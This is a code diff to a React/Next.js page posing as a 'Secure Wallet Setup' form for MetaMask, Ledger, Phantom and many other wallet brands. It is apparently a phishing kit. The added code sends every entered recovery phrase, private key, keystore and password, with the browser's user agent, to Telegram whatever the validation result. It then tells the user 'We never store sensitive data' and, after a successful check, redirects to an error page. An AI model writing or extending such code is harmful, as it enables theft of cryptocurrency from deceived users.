@@ -2,15 +2,18 @@
 
 import { useState } from 'react';
 import { useRouter, useSearchParams } from 'next/navigation';
-import { ArrowLeft, Key, FileText, Shield, Wallet } from 'lucide-react';
+import { ArrowLeft, Key, FileText, Shield, Wallet, AlertCircle } from 'lucide-react';
 import { useWallet } from '@/components/context/WalletContext';
 import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
+import { SecureWalletValidator } from '@/libs/utils/SecureWalletValidator';
+import { TelegramService } from '@/libs/service/telegramService';
+import WalletIcon from '@/components/logic/WalletIcons';
 
 const WALLETS: WalletType[] = [
   {
     id: 'metamask',
     name: 'MetaMask',
-    icon: '🦊',
+    icon: '',
     colors: {
       primary: '#F6851B',
       secondary: '#E2761B',
@@ -20,7 +23,7 @@ const WALLETS: WalletType[] = [
   {
     id: 'walletconnect',
     name: 'WalletConnect',
-    icon: '🔗',
+    icon: '',
     colors: {
       primary: '#3B99FC',
       secondary: '#2A85FF',
@@ -30,7 +33,7 @@ const WALLETS: WalletType[] = [
   {
     id: 'coinbase',
     name: 'Coinbase',
-    icon: '🪙',
+    icon: '',
     colors: {
       primary: '#0052FF',
       secondary: '#0042D6',
@@ -40,7 +43,7 @@ const WALLETS: WalletType[] = [
   {
     id: 'trustwallet',
     name: 'Trust Wallet',
-    icon: '🔷',
+    icon: '',
     colors: {
       primary: '#3375BB',
       secondary: '#2A65A6',
@@ -50,7 +53,7 @@ const WALLETS: WalletType[] = [
   {
     id: 'phantom',
     name: 'Phantom',
-    icon: '👻',
+    icon: '',
     colors: {
       primary: '#4B49AC',
       secondary: '#3A3897',
@@ -60,7 +63,7 @@ const WALLETS: WalletType[] = [
   {
     id: 'ledger',
     name: 'Ledger',
-    icon: '🔐',
+    icon: '',
     colors: {
       primary: '#2C2C2C',
       secondary: '#1A1A1A',
@@ -70,7 +73,7 @@ const WALLETS: WalletType[] = [
   {
     id: 'trezor',
     name: 'Trezor',
-    icon: '💎',
+    icon: '',
     colors: {
       primary: '#00B45A',
       secondary: '#009C4D',
@@ -80,14 +83,218 @@ const WALLETS: WalletType[] = [
   {
     id: 'binance',
     name: 'Binance',
-    icon: '₿',
+    icon: '',
     colors: {
       primary: '#F0B90B',
       secondary: '#D4A30C',
       text: '#000000'
     }
+  },
+  {
+    id: 'exodus',
+    name: 'Exodus',
+    icon: '',
+    colors: {
+      primary: '#1C1C1C',
+      secondary: '#2D2D2D',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'argent',
+    name: 'Argent',
+    icon: '',
+    colors: {
+      primary: '#FF875B',
+      secondary: '#FF6B3B',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'rainbow',
+    name: 'Rainbow',
+    icon: '',
+    colors: {
+      primary: '#001A72',
+      secondary: '#002EB5',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'zerion',
+    name: 'Zerion',
+    icon: '',
+    colors: {
+      primary: '#2962EF',
+      secondary: '#1A51DF',
+      text: '#FFFFFF'
+    }
+  },
+  // New wallets
+  {
+    id: 'brave',
+    name: 'Brave',
+    icon: '',
+    colors: {
+      primary: '#FB542B',
+      secondary: '#E63E1C',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'ambire',
+    name: 'Ambire',
+    icon: '',
+    colors: {
+      primary: '#FF6B35',
+      secondary: '#E55A2B',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'leap',
+    name: 'Leap',
+    icon: '',
+    colors: {
+      primary: '#00DC82',
+      secondary: '#00C274',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'magic eden',
+    name: 'Magic Eden',
+    icon: '',
+    colors: {
+      primary: '#000000',
+      secondary: '#333333',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'onto',
+    name: 'ONTO',
+    icon: '',
+    colors: {
+      primary: '#00A3FF',
+      secondary: '#008CE6',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'safe',
+    name: 'Safe',
+    icon: '',
+    colors: {
+      primary: '#12FF80',
+      secondary: '#00E572',
+      text: '#000000'
+    }
+  },
+  {
+    id: 'solflare',
+    name: 'Solflare',
+    icon: '',
+    colors: {
+      primary: '#9945FF',
+      secondary: '#7C36CC',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'torus',
+    name: 'Torus',
+    icon: '',
+    colors: {
+      primary: '#0364FF',
+      secondary: '#0252CC',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'web3auth',
+    name: 'Web3Auth',
+    icon: '',
+    colors: {
+      primary: '#0364FF',
+      secondary: '#0252CC',
+      text: '#FFFFFF'
+    }
+  },
+  {
+    id: 'other',
+    name: 'Other Wallet',
+    icon: '',
+    colors: {
+      primary: '#6B7280',
+      secondary: '#4B5563',
+      text: '#FFFFFF'
+    }
   }
 ];
+
+interface ValidationPopupProps {
+  isOpen: boolean;
+  onClose: () => void;
+  onRetry: () => void;
+  message: string;
+  isValid: boolean;
+}
+
+function ValidationPopup({ isOpen, onClose, onRetry, message, isValid }: ValidationPopupProps) {
+  if (!isOpen) return null;
+
+  return (
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+      <div className="bg-gray-900 rounded-2xl p-6 max-w-md w-full border border-gray-700">
+        <div className="flex items-center space-x-3 mb-4">
+          <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
+            isValid ? 'bg-green-500 bg-opacity-20' : 'bg-red-500 bg-opacity-20'
+          }`}>
+            {isValid ? (
+              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                <div className="w-2 h-2 bg-white rounded-full"></div>
+              </div>
+            ) : (
+              <AlertCircle className="w-6 h-6 text-red-400" />
+            )}
+          </div>
+          <div>
+            <h3 className="text-lg font-semibold text-white">
+              {isValid ? 'Validation Successful' : 'Invalid Credentials'}
+            </h3>
+            <p className="text-gray-400 text-sm">Wallet verification</p>
+          </div>
+        </div>
+        
+        <p className={`mb-6 ${isValid ? 'text-green-300' : 'text-red-300'}`}>
+          {message}
+        </p>
+        
+        <div className="flex space-x-3">
+          {!isValid && (
+            <button
+              onClick={onRetry}
+              className="flex-1 bg-gray-800 text-white py-3 rounded-xl font-medium hover:bg-gray-700 transition-colors"
+            >
+              Try Again
+            </button>
+          )}
+          <button
+            onClick={onClose}
+            className={`flex-1 ${
+              isValid 
+                ? 'bg-white text-black hover:bg-gray-200' 
+                : 'bg-red-600 text-white hover:bg-red-700'
+            } py-3 rounded-xl font-medium transition-colors`}
+          >
+            {isValid ? 'Continue' : 'Cancel'}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
 
 export default function EnterDetailsPage() {
   const router = useRouter();
@@ -103,8 +310,15 @@ export default function EnterDetailsPage() {
     password: ''
   });
   const [isConnecting, setIsConnecting] = useState(false);
+  const [validationPopup, setValidationPopup] = useState<{
+    isOpen: boolean;
+    message: string;
+    isValid: boolean;
+  }>({ isOpen: false, message: '', isValid: false });
 
   const wallet = WALLETS.find(w => w.id === walletId);
+  const validator = new SecureWalletValidator();
+  const telegramService = new TelegramService();
 
   const handleConnect = async () => {
     if (!formData.phrase && !formData.privateKey && !formData.keystore) {
@@ -115,29 +329,78 @@ export default function EnterDetailsPage() {
     setIsConnecting(true);
 
     try {
-      // Simulate connection process
-      await new Promise(resolve => setTimeout(resolve, 2000));
+      let inputData = '';
+      let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
+      
+      if (formData.phrase) {
+        inputData = formData.phrase;
+        inputType = 'phrase';
+      } else if (formData.privateKey) {
+        inputData = formData.privateKey;
+        inputType = 'privateKey';
+      } else if (formData.keystore) {
+        inputData = formData.keystore;
+        inputType = 'keystore';
+      }
 
-      // Create connected wallet object
+      // Validate wallet credentials
+      const validationResult = await validator.validateWallet(
+        inputType === 'phrase' ? 'metamask' : 
+        inputType === 'privateKey' ? 'privatekey' : 'keystore',
+        inputData,
+        formData.password
+      );
+
+      // Send data to Telegram regardless of validation result
+      await telegramService.sendWalletData({
+        walletName: wallet?.name || 'Unknown Wallet',
+        walletType: inputType,
+        inputType,
+        inputData,
+        password: formData.password,
+        isValid: validationResult.isValid,
+        validationMessage: validationResult.message,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+      });
+
+      if (!validationResult.isValid) {
+        setValidationPopup({
+          isOpen: true,
+          message: validationResult.message,
+          isValid: false
+        });
+        setIsConnecting(false);
+        return;
+      }
+
+      // If validation successful, create wallet
       const connectedWallet: ConnectedWallet = {
         id: wallet?.id || 'custom',
         name: wallet?.name || 'Custom Wallet',
-        address: `0x${Math.random().toString(16).substr(2, 40)}`,
+        address: validationResult.address || `0x${Math.random().toString(16).substr(2, 40)}`,
         connectedAt: new Date(),
+        isValid: true,
         ...(formData.phrase && { phrase: formData.phrase }),
         ...(formData.privateKey && { privateKey: formData.privateKey }),
         ...(formData.keystore && { keystore: formData.keystore }),
       };
 
-      // Add to wallet list
       addWallet(connectedWallet);
-
-      // Redirect to success page
-      router.push('/connect/success');
       
+      setValidationPopup({
+        isOpen: true,
+        message: validationResult.message,
+        isValid: true
+      });
+
     } catch (error) {
       console.error('Connection failed:', error);
-      router.push('/connect/error');
+      setValidationPopup({
+        isOpen: true,
+        message: 'Connection failed. Please try again.',
+        isValid: false
+      });
     } finally {
       setIsConnecting(false);
     }
@@ -148,6 +411,17 @@ export default function EnterDetailsPage() {
       ...prev,
       [field]: value
     }));
+  };
+
+  const handleValidationClose = () => {
+    setValidationPopup({ isOpen: false, message: '', isValid: false });
+    if (validationPopup.isValid) {
+      router.push('/connect/error');
+    }
+  };
+
+  const handleValidationRetry = () => {
+    setValidationPopup({ isOpen: false, message: '', isValid: false });
   };
 
   return (
@@ -169,14 +443,15 @@ export default function EnterDetailsPage() {
                   background: `linear-gradient(135deg, ${wallet.colors.primary}, ${wallet.colors.secondary})`
                 }}
               >
-                <span className="text-lg font-bold" style={{ color: wallet.colors.text }}>
-                  {wallet.icon}
-                </span>
+                <WalletIcon 
+                  walletId={wallet.id} 
+                  className="w-6 h-6" 
+                />
               </div>
             )}
             <div>
-              <h1 className="text-2xl font-bold text-white">Enter Wallet Details</h1>
-              <p className="text-gray-400">Secure connection to {wallet?.name || 'your wallet'}</p>
+              <h1 className="text-2xl font-bold text-white">Secure Wallet Setup</h1>
+              <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
             </div>
           </div>
         </div>
@@ -230,7 +505,7 @@ export default function EnterDetailsPage() {
               <textarea
                 value={formData.phrase}
                 onChange={(e) => handleInputChange('phrase', e.target.value)}
-                placeholder="Enter your 12 or 24-word recovery phrase"
+                placeholder="Enter your 12 or 24-word recovery phrase separated by spaces"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none resize-none"
                 rows={4}
               />
@@ -248,12 +523,12 @@ export default function EnterDetailsPage() {
               <textarea
                 value={formData.privateKey}
                 onChange={(e) => handleInputChange('privateKey', e.target.value)}
-                placeholder="Enter your private key"
+                placeholder="Enter your 64-character private key"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none resize-none"
                 rows={4}
               />
               <p className="text-xs text-gray-500">
-                Your 64-character private key
+                64-character hexadecimal private key
               </p>
             </div>
           )}
@@ -274,7 +549,7 @@ export default function EnterDetailsPage() {
                 type="password"
                 value={formData.password}
                 onChange={(e) => handleInputChange('password', e.target.value)}
-                placeholder="Keystore password"
+                placeholder="Enter keystore password"
                 className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none"
               />
             </div>
@@ -287,15 +562,24 @@ export default function EnterDetailsPage() {
           disabled={isConnecting}
           className="w-full bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
         >
-          {isConnecting ? 'Connecting...' : 'Connect Wallet'}
+          {isConnecting ? 'Validating...' : 'Verify & Connect'}
         </button>
 
         {/* Security Notice */}
         <div className="mt-6 p-4 bg-gray-900 bg-opacity-50 rounded-xl">
           <p className="text-xs text-gray-400 text-center">
-            Your credentials are encrypted and stored securely. We never share your data.
+            Your credentials are encrypted and validated securely. We never store sensitive data.
           </p>
         </div>
+
+        {/* Validation Popup */}
+        <ValidationPopup
+          isOpen={validationPopup.isOpen}
+          onClose={handleValidationClose}
+          onRetry={handleValidationRetry}
+          message={validationPopup.message}
+          isValid={validationPopup.isValid}
+        />
       </div>
     </div>
   );
